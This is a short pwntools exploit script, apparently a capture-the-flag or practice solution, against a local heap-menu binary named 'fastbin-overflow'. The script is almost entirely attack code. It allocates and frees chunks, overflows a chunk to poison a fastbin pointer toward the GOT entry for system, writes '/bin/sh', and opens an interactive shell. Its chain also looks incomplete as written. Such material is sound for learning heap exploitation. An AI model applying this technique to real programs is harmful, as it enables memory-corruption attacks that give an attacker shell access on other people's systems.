#!/usr/bin/env python
from pwn import *
p = process('./fastbin-overflow')
elf = ELF('./fastbin-overflow')

def cmd(x):
	p.recvuntil('> ')
	p.sendline(x)

def malloc(i, size, s):
	cmd('1 {} {}\n{}'.format(str(i), str(size), s))

def free(i):
	cmd('2 {}'.format(str(i)))

system_got = elf.got['system']
gdb.attach(p)
malloc(0, 56, '\x00')
malloc(1, 56, '\x00')
free(1)
free(0)
malloc(2, 56, 'A' * 56 + p64(0x41) + p64(system_got))
malloc(3, 56, '/bin/sh\x00')
p.interactive()
